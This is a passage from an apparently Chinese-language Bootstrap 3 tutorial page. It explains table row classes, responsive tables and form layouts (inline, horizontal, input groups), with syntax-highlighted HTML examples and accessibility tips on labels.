class="hljs-string">&quot;success&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;warning&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;danger&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- On cells (`td` or `th`) --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;warning&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;danger&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-7-响应式表格"><a href="#4-7-响应式表格" class="headerlink" title="4.7 响应式表格"></a>4.7 响应式表格</h3><p>将任何 <code>.table</code> 元素包裹在 <code>.table-responsive</code> 元素内，即可创建响应式表格，其会在小屏幕设备上（小于768px）水平滚动。当屏幕大于 768px 宽度时，水平滚动条消失。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table-responsive&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table table-condensed&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>class<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>grade<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="5-表单"><a href="#5-表单" class="headerlink" title="5.表单"></a>5.表单</h2><h3 id="5-1-基本实例"><a href="#5-1-基本实例" class="headerlink" title="5.1 基本实例"></a>5.1 基本实例</h3><p>单独的表单控件会被自动赋予一些全局样式。所有设置了 <code>.form-control</code> 类的 <code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code> 和 <code>&lt;select&gt;</code> 元素都将被默认设置宽度属性为 <code>width: 100%;</code>。 将 <code>label</code> 元素和前面提到的控件包裹在 <code>.form-group</code> 中可以获得最好的排列。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span>&gt;</span>Email address<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Email&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputFile&quot;</span>&gt;</span>File input<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputFile&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;help-block&quot;</span>&gt;</span>Example block-level help text here.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span> Check me out<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>不要将表单组直接和输入框组混合使用。而建议将输入框组嵌套到表单组中使用。</strong></p><h3 id="5-2-内联表单"><a href="#5-2-内联表单" class="headerlink" title="5.2 内联表单"></a>5.2 内联表单</h3><p>为 <code>&lt;form&gt;</code> 元素添加 <code>.form-inline</code> 类可使其内容左对齐并且表现为 <code>inline-block</code> 级别的控件。<strong>只适用于视口（viewport）至少在 768px 宽度时（视口宽度再小的话就会使表单折叠）。</strong></p><p>在 Bootstrap 中，输入框和单选/多选框控件默认被设置为 <code>width: 100%;</code> 宽度。在内联表单，我们将这些元素的宽度设置为 <code>width: auto;</code>，因此，多个控件可以排列在同一行。</p><p> 一定要添加 <code>label</code> 标签。如果你没有为每个输入控件设置 <code>label</code> 标签，屏幕阅读器将无法正确识别。对于这些内联表单，你可以通过为 <code>label</code> 设置 <code>.sr-only</code> 类将其隐藏。还有一些辅助技术提供label标签的替代方案，比如 <code>aria-label</code>、<code>aria-labelledby</code> 或 <code>title</code> 属性。如果这些都不存在，屏幕阅读器可能会采取使用 <code>placeholder</code> 属性，如果存在的话，使用占位符来替代其他的标记，但要注意，这种方法是不妥当的。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//实例一<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-inline&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputName2&quot;</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputName2&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Jane Doe&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputEmail2&quot;</span>&gt;</span>Email<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputEmail2&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;jane.doe@example.com&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Send invitation<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>//实例二<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-inline&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputEmail3&quot;</span>&gt;</span>Email address<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputEmail3&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Email&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputPassword3&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputPassword3&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span> Remember me<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Sign in<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>//实例三<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-inline&quot;</span>&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;exampleInputAmount&quot;</span>&gt;</span>Amount (in dollars)<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span>&gt;</span>$<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exampleInputAmount&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Amount&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-group-addon&quot;</span>&gt;</span>.00<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>Transfer cash<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-3-水平排列的表单"><a href="#5-3-水平排列的表单" class="headerlink" title="5.3 水平排列的表单"></a>5.3 水平排列的表单</h3><p>通过为表单添加 <code>.form-horizontal</code> 类，并联合使用 Bootstrap 预置的栅格类，可以将 <code>label</code> 标签和控件组水平并排布局。这样做将改变 <code>.form-group</code> 的行为，使其表现为栅格系统中的行（row），因此就无需再额外添加 <code>.row</code> 了。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-horizontal&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;inputEmail3&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-2 control-label&quot;</span>&gt;</span>Email<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-10&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;inputEmail3&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Email&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;inputPassword3&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-2 control-label&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-10&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;inputPassword3&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-offset-2 col-sm-10&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span> Remember me<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-offset-2 col-sm-10&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Sign in<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-4-输入框"><a href="#5-4-输入框" class="headerlink" title="5.4 输入框"></a>5.4 输入框</h3><p>包括大部分表单控件、文本输入域控件，还支持所有 HTML5 类型的输入控件： <code>text</code>、<code>password</code>、<code>datetime</code>、<code>datetime-local</code>、<code>date</code>、<code>month</code>、<code>time</code>、<code>week</code>、<code>number</code>、<code>email</code>、<code>url</code>、<code>search</code>、<code>tel</code> 和 <code>color</code>。</p><p>只有正确设置了 <code>type</code> 属性的输入控件才能被赋予正确的样式。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Text input&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="5-4-1-输入框组"><a href="#5-4-1-输入框组" class="headerlink" title="5.4.1 输入框组"></a>5.4.1 输入框组</h4><p>在输入域前（后）面添加文本内容或按钮控件。</p><p>通过在文本输入框 <code>&lt;input&gt;</code> 前面、后面或是两边加上文字或按钮，可以实现对表单控件的扩展。为 <code>.input-group</code> 赋予 <code>.input-group-addon</code> 或 <code>.input-group-btn</code> 类，可以给 <code>.form-control</code> 的前面或后面添加额外的元素。</p><blockquote><ol><li>基本实例</li></ol></blockquote><p><strong>不支持在输入框的单独一侧添加多个额外元素（<code>.input-group-addon</code> 或 <code>.input-group-btn</code>）。</strong> <strong>不支持在单个输入框组中添加多个表单控件。</strong></p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span 